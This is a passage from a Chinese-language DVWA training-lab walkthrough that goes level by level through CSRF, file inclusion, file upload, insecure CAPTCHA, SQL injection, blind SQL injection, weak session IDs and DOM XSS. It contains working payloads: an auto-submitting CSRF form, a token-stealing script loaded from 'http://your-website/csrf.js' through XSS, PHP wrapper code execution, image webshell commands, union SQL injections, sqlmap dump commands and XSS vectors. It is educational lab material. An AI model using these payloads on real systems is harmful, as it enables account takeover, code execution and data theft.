mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } } else { // Didn't come from a trusted source echo \"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; 关键代码如下 if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) $_SERVER[ 'HTTP_REFERER' ]: 这是一个 HTTP 请求头，它包含了当前请求的来源页面的 URL。 $_SERVER[ 'SERVER_NAME' ]: 这是当前服务器的主机名。 这里判断用户访问该网站的来源地址是否与网站的host相同，如果不相同这说明来源有问题。如果一致，则认为是真正的用户，接着更新密码，同时拒绝了SQL注入。同时这关放弃了token的检验 这里就是考察我们对于stripos的理解了，由于该函数只是判断待查询字符串是否包含指定的字符，这意味着我们造构造恶意网址的时候，只需要在网址中包含与正确网站的host_name相同的部分即可 首先精心构造一个HTML页面 &lt;html&gt; &lt;head&gt; &lt;title&gt;CSRF&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;from method=\"get\" id=\"csrf\" action=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\"&gt; &lt;input type=\"hidden\" name=\"password_new\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"password_conf\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"change\" value=\"123456\"&gt; &lt;/from&gt; &lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 当用户访问该页面的时候由于&lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt;的执行，导致用户自动提交给了上面表单内容，进行密码的修改。 接下来就是对于该html页面网址的构造了 **目录混淆：**将上述 html 页面放到服务器的 127.0.0.1 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址： http://www.sqlsec.com/127.0.0.1/csrf.html **文件名混淆：**将上述 html 文件重命名为 127.0.0.1.html，然后访问如下 payload： http://www.sqlsec.com/127.0.0.1.html 这里有师傅提醒：这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。 ？拼接混淆referer： http://www.sqlsec.com/csrf.html?127.0.0.1 因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。 High if ($_SERVER['REQUEST_METHOD'] == \"POST\" &amp;&amp; array_key_exists (\"CONTENT_TYPE\", $_SERVER) &amp;&amp; $_SERVER['CONTENT_TYPE'] == \"application/json\") { $data = json_decode(file_get_contents('php://input'), true); $request_type = \"json\"; if (array_key_exists(\"HTTP_USER_TOKEN\", $_SERVER) &amp;&amp; array_key_exists(\"password_new\", $data) &amp;&amp; array_key_exists(\"password_conf\", $data) &amp;&amp; array_key_exists(\"Change\", $data)) { $token = $_SERVER['HTTP_USER_TOKEN']; $pass_new = $data[\"password_new\"]; $pass_conf = $data[\"password_conf\"]; $change = true; } } else { if (array_key_exists(\"user_token\", $_REQUEST) &amp;&amp; array_key_exists(\"password_new\", $_REQUEST) &amp;&amp; array_key_exists(\"password_conf\", $_REQUEST) &amp;&amp; array_key_exists(\"Change\", $_REQUEST)) { $token = $_REQUEST[\"user_token\"]; $pass_new = $_REQUEST[\"password_new\"]; $pass_conf = $_REQUEST[\"password_conf\"]; $change = true; } } 这串代码主要是判断用户传入的数据是否为json类型，如果是的话，进行json解密传给data，接着判断是否存在四个指定的变量，如果存在，则各自赋值。如果不是json数据类型，则仍然判断是否存在这四个变量，如果存在则分别赋值 if ($change) { // Check Anti-CSRF token checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' ); // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysqli_real_escape_string ($GLOBALS[\"___mysqli_ston\"], $pass_new); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '\" . $pass_new . \"' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ); // Feedback for the user $return_message = \"Password Changed.\"; } else { // Issue with passwords matching $return_message = \"Passwords did not match.\"; } mysqli_close($GLOBALS[\"___mysqli_ston\"]); if ($request_type == \"json\") { generateSessionToken(); header (\"Content-Type: application/json\"); print json_encode (array(\"Message\" =&gt;$return_message)); exit; } else { echo \"&lt;pre&gt;\" . $return_message . \"&lt;/pre&gt;\"; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这里显示检查了用户token是否与session匹配，然后判断两次密码输入是否一致，如果一致则直接进行密码的更新，同时防止了SQL注入的可能。 很明显这里并不能有效的阻止CSRF的存在，只要我们想办法可以获取到用户的token即可成功攻击。 JS发起HTTP CSRF请求 新建一个csrf.js文件： // 首先访问这个页面 来获取 token var tokenUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/'; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } var count = 0; xmlhttp.withCredentials = true; xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) { // 使用正则提取 token var text = xmlhttp.responseText; var regex = /user_token\\' value\\=\\'(.*?)\\' \\/\\&gt;/; var match = text.match(regex); var token = match[1]; // 发起 CSRF 请求 将 token 带入 var new_url = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=123456&amp;password_conf=123456&amp;Change=Change'; if(count==0){ count++; xmlhttp.open(\"GET\",new_url,false); xmlhttp.send(); } } }; xmlhttp.open(\"GET\",tokenUrl,false); xmlhttp.send(); 将这个 csrf.js 上传到外网的服务器上，http://your-website/csrf.js，随后访问dvwa的xss high级别，插入恶意js代码 http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=\"http://your-website/csrf.js\"&gt;&lt;/script&gt; 这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 123456 了 另外这里学习了国光师傅的另一种思路： 常规 HTML 发起 CSRF 请求 假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。 &lt;script&gt; function attack(){ var token = document.getElementById(\"get_token\").contentWindow.document.getElementsByName('user_token')[0].value document.getElementsByName('user_token')[0].value=token; alert(token); document.getElementById(\"csrf\").submit(); } &lt;/script&gt; &lt;iframe src=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\" id=\"get_token\" style=\"display:none;\"&gt; &lt;/iframe&gt; &lt;body onload=\"attack()\"&gt; &lt;form method=\"GET\" id=\"csrf\" action=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\"&gt; &lt;input type=\"hidden\" name=\"password_new\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"password_conf\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"user_token\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\"&gt; &lt;/form&gt; &lt;/body&gt; 将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，我们可以将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击： http://127.0.0.1/dvwa/csrf.html Impossible 与之前的级别不同点在于，这里增加了一个输入框，要求用户写出当前密码，只有当前密码是正确的，才会执行修改密码的操作。 这对于不知道受害者原始密码的攻击者来说，根本无法完成CSRF攻击了。 0x04 File Inclusion Low &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; ?&gt; 可以看到非常捡漏，对于page参数没有做任何限制，这意味着我们可以实现任意文件包含，而这里的包含函数并不在此代码中。 文件读取 正常在linux下是是要读取/etc/passwd等文件的 远程文件包含 本地文件包含 Getshell 这里需要匹配文件上传漏洞，来进行本地包含 远程文件包含 Getshell 当然这里也可以包含远程服务器上的恶意文件getshell，就不演示了 伪协议读取 php://filter ?page=php://filter/convert.base64-encode/resource=index.php 解码即可 php://input getshell &lt;?php fputs(fopen('info.php','w'),'&lt;?php phpinfo();?&gt;')?&gt; 不过这里不知道是和原因，hackbar发不出去，只能bp发送 data:// 伪协议 数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码： /fi/?page=data:text/plain,&lt;?php phpinfo();?&gt; /fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b Medium &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( \"http://\", \"https://\" ), \"\", $file ); $file = str_replace( array( \"../\", \"..\\\\\" ), \"\", $file ); ?&gt; 这里加了几个过滤，将http协议与https协议过滤为空，以及防止目录穿越。 但这里我们注意到没有过滤伪协议，以及它仅仅是将敏感字符过滤为空，这意味着我们可以双写绕过 ?page=....//....//....//flag.txt 同样的远程文件包含也可以双写绕过 ?page=hhttp://ttp://www.baidu.com/robots.txt High &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( \"file*\", $file ) &amp;&amp; $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } ?&gt; 这里说如果page参数不是以file开头的，或者不是include.php，则exit退出，很明显可以用file伪协议 Impossible &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Only allow include.php or file{1..3}.php if( $file != \"include.php\" &amp;&amp; $file != \"file1.php\" &amp;&amp; $file != \"file2.php\" &amp;&amp; $file != \"file3.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } ?&gt; 这里进行了白名单过滤，如果不是这三个指定文件中的一个，则exit退出，很明显我们无法进行攻击了。 0x05 File Upload Low &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } ?&gt; 首先自定义了上传路径，接着直接对upload参数内容进行上传，并没有对内容做出过滤。很明显可以任意文件上传 这里将上传文件路径输出了，直接跟着路径访问即可 Medium &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } ?&gt; 依旧是定义了上传路径，接着取出了上传文件的文件名，文件类型，文件大小。 如果文件类型不是jpeg或者png，且文件上传大小超出了限制，则上传失败，否则成功上传。 但这里只是对content-type做出了限制，我们修改即可 High &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } ?&gt; 这里是取出了文件上传时的后缀名，如果不是jpg或者jpeg或者png，则上传失败。同时还使用getimagesize函数检测上传的文件是否为图片，这里可以使用图片马绕过。 Linux下图片马的制作： # 将 shell.php 内容追加到 pic.png cat shell.php &gt;&gt; pic.png # png + php 合成 png 图马 cat pic.png shell.php &gt;&gt; shell.png # 直接 echo 追加 echo '&lt;?php phpinfo();?&gt;' &gt;&gt; pic.png Windows下图片马的制作： copy pic.png/b+shell.php/a shell.png 正常制作图片马上传即可，接着利用上一关的文件包含漏洞包含png使其解析其中的PHP代码即可 Impossible &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \"&lt;pre&gt;&lt;a href='{$target_path}{$target_file}'&gt;{$target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;\"; } else { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 使用了时间戳的md5值做文件名，然后添加文件后缀，接着判断后缀名以及content-type类型，和检测是否为图片，同时使用imagecreatefrompng等类似函数，删除掉了元数据，创建新图像。意味着图片马也无法绕过了 0x06 Insecure CAPTCHA Low if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key'], $_POST['g-recaptcha-response'] ); // Did the CAPTCHA fail? if( !$resp ) { // What happens when the CAPTCHA was entered incorrectly $html .= \"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;\"; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo \" &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\\"#\\\" method=\\\"POST\\\"&gt; &lt;input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"{$pass_new}\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"{$pass_conf}\\\" /&gt; &lt;input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" /&gt; &lt;/form&gt;\"; } else { // Both new passwords do not match. $html .= \"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;\"; $hide_form = false; } } } 前半部分代码如上，这里看到他会先去判断验证码是否正确，如果正确才会接着去判断密码修改情况。否则报错 关键在于第二部分代码： if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the end user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with the passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; 这里在if语句的开头都对step的参数做了判断，如果是2的话，就默认为经历了step=1的验证码的验证，接着取将修改后的密码直接插入数据库更新（同时防止了SQL注入） 这意味着我们可以在修改密码之后，bp抓包修改step的值来绕过 Medium 这里与上一关的不同点在于，上述图片中的表单form中添加了一个隐藏元素passed_captcha并被设置为了true，这会被用于第二步 他会判断passed_captcha表单元素是否存在，也就是判断了step=1这一步是否被执行过，但我们依旧可以bp修改绕过，只需要抓包修改step为2进入第二个if判断，接着添加passed_captcha元素为true即可 High 与前几个级别不同点在于，这一关取消了step的判断，但却在判断验证码是否正确的同时，多了如下代码 $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3' &amp;&amp; $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA' 这明摆着，直接bp修改即可，如下图，添加g-recaptcha-response的同时，修改UA头，即可绕过，但这里我似乎还需要删除step这个参数才能成功，不知为何 Impossible if( isset( $_POST[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); $pass_conf = $_POST[ 'password_conf' ]; $pass_conf = stripslashes( $pass_conf ); $pass_conf = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_conf ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_conf = md5( $pass_conf ); $pass_curr = $_POST[ 'password_current' ]; $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_curr = md5( $pass_curr ); // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], $_POST['g-recaptcha-response'] ); 这一关添加了token反正了CSRF，同时添加了要求用户填写当前密码的功能，也防止了SQL注入，接着判断验证码是否匹配。 很明显这里修改了前几个级别犯的错误，我们已经没有办法通过增删参数来绕过了。 0x07 SQL Injection Low 如上图所示，这里显示判断数据库类型（并不需要在意），随后对用户输入的id参数进行拼接SQL语句查询，然后直接连接数据库查询对应id的数据，并未做出任何过滤，我们只需要正确闭合SQL语句即可 ?id=1' union select version(), database()--+&amp;Submit=Submit# 由于代码本身就支持展示多行数据，也就没必要搞什么分隔符之类的来明晰数据了 ?id=1' union select user, password from users--+ Medium 修改的点在于采用mysqli_real_escape_string函数来对特殊字符进行转义，其中特殊字符如下图所展示 但这里幸运的是，改为了数字型查询。但这里有限制的点在于，当我们查到表名为users，接来下回去查询users中的列名，那无疑是需要单引号或者双引号包围的，但我们可以通过16进制绕过，因为SQL数据库对16进制数据会自动转换为10进制识别 High 这一级别与第一关类似，只不过id的位置在session，并不在页面当中了 我们在input输入框中输入：?id=-1' union select user, password from users--+即可 Impossible 这里多了一个token的验证，同时判断用户输入的id是否为数字类型，如果不是直接无效，如果是的话，强制转换为整数类型，接着采用PDO预编译，导致我们无法进行SQL语句的闭合 prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。 0x08 SQL Injection (Blind) Low 上述两处代码结合会发现，即使我们查询成功，也只会显示是否成功的消息展示，并不会将数据显示出来，这意味着我们只能进行盲注了 同时这与SQL注入类似，并不没有做出任何过滤 python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" --current-db python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa --tables python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa -T users --dump --batch Medium 依旧是盲注，虽然这里对id参数做了特殊字符转移，但类似0x07的 SQL注入，我们依旧是可以绕过的，比如16进制。 交给sqlmap完全可以 python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=medium; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa -T users --dump --batch High 不同点在于id的位置换成了cookie，但仍然没有做出有效的限制，依旧可以sqlmap python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/\" --cookie \"id=1*; security=high; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa -T users --dump --batch Impossible 这一等级同样采用了PDO的SQL预编译、防止CSRF，检查id是否为数字型。 0x09 Weak Session IDs 一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。 SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。 Low &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { if (!isset ($_SESSION['last_session_id'])) { $_SESSION['last_session_id'] = 0; } $_SESSION['last_session_id']++; $cookie_value = $_SESSION['last_session_id']; setcookie(\"dvwaSession\", $cookie_value); } ?&gt; 这里的代码逻辑是，只要post方法请求一次，就会令session_id++，当然如果不存在的话，置零。 这很容易让攻击者伪造cookie，我们这里bp抓包一次发现如下 当我们将这个cookie复制下来，然后换一个浏览器访问该weak_session_id对应的url，会发现不需要登录直接就到达指定url页面 Medium &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { $cookie_value = time(); setcookie(\"dvwaSession\", $cookie_value); } ?&gt; 这里是采用时间戳作为session会话，但是这里时间戳也是有规律可循的，是可以伪造的。我们采用时间戳转换工具： https://tool.lu/timestamp/ 这里我们可以选一个未来的时间，并转换为时间戳，接着我们可以诱骗用户在这一时间点击这一关的generate按钮 当其点击过之后，我们便可以成功进行伪造了 Cookie: dvwaSession=1705061825; security_level=0; ajs_anonymous_id=f11e1270-bf66-42b5-b337-91c6d4d5ff4f; ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c; ocKey=512389862aecb2132976ffe9960380f4; PHPSESSID=mc4bn9ou74faqboqg56aag47t0; security=medium 将我们准备的时间戳伪造成cookie，接着换一个其他浏览器发送，即可绕过登录 High &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { if (!isset ($_SESSION['last_session_id_high'])) { $_SESSION['last_session_id_high'] = 0; } $_SESSION['last_session_id_high']++; $cookie_value = md5($_SESSION['last_session_id_high']); setcookie(\"dvwaSession\", $cookie_value, time()+3600, \"/vulnerabilities/weak_id/\", $_SERVER['HTTP_HOST'], false, false); } ?&gt; 这里与第一个low级别类似，不过这里的session经过了md5加密。我们bp抓包的时候可以很容易看出来md5的迹象的，经过一个解密即可知道是由数字0开始++之后得到的整数的md5加密值，依旧很容易构造 Impossible &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { $cookie_value = sha1(mt_rand() . time() . \"Impossible\"); setcookie(\"dvwaSession\", $cookie_value, time()+3600, \"/vulnerabilities/weak_id/\", $_SERVER['HTTP_HOST'], true, true); } ?&gt; 这里设置了随机数，然后拼接当前时间戳和impossible，最后经过sha1加密，如果我们不能得到随机数种子，以及后面的Impossible字符，是根本无法构造的。 这只是代码审计的前提下才知道其构造原理，如果单纯抓包等等，基本不可能判断出来其session产生原理。 0x10 XSS(DOM) Low &lt;?php # No protections, anything goes ?&gt; 无任何保护。。。。 我们看一下页面关于此处的html源码 &lt;div class=\"vulnerable_code_area\"&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name=\"XSS\" method=\"GET\"&gt; &lt;select name=\"default\"&gt; &lt;script&gt; if (document.location.href.indexOf(\"default=\") &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); document.write(\"&lt;option value='\" + lang + \"'&gt;\" + $decodeURI(lang) + \"&lt;/option&gt;\"); document.write(\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\"); } document.write(\"&lt;option value='English'&gt;English&lt;/option&gt;\"); document.write(\"&lt;option value='French'&gt;French&lt;/option&gt;\"); document.write(\"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;\"); document.write(\"&lt;option value='German'&gt;German&lt;/option&gt;\"); &lt;/script&gt; &lt;/select&gt; &lt;input type=\"submit\" value=\"Select\" /&gt; &lt;/form&gt; &lt;/div&gt; 很明显这里对用户的输入复制给了lang变量，接着在没有任何过滤的情况下直接进行url解码拼接到document.write函数下 Medium &lt;?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"&lt;script\") !== false) { header (\"location: ?default=English\"); exit; } } ?&gt; 这里过滤了&lt;script标签，但我们还可以选择更多的标签来绕过 ?default=&lt;img src=1 onerror=alert('hacker')&gt; 但毕竟我们换了标签，必须要闭合前面的标签，否则这里的img标签便不起作用了 闭合option与select标签即可 